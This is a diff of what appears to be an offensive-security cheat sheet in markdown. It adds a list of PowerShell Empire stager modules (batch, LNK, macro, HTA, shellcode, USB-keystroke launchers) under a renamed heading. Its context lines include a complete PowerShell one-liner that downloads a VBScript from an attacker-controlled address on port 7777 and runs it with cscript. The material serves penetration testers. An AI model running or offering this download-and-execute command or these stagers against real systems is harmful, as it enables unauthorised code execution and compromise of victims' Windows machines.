@@ -59,7 +59,24 @@ Msvenom Vbscript
 powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://192.168.189.131:7777/ms.vbs', '%temp%\ms.vbs'); Start-Process %windir%\system32\cscript.exe -Filepath '%temp%\ms.vbs'"
 ```
 
-Powershell empire payload 
+Powershell empire stager
+```
+windows/launcher_bat
+windows/launcher_lnk
+windows/launcher_sct
+windows/launcher_vbs
+windows/launcher_xml
+windows/backdoorLnkMacro  
+windows/macro
+windows/bunny             
+windows/macroless_msword
+windows/csharp_exe        
+windows/shellcode
+windows/dll               
+windows/teensy
+windows/ducky
+windows/hta
+```
 
 Powersploit
 
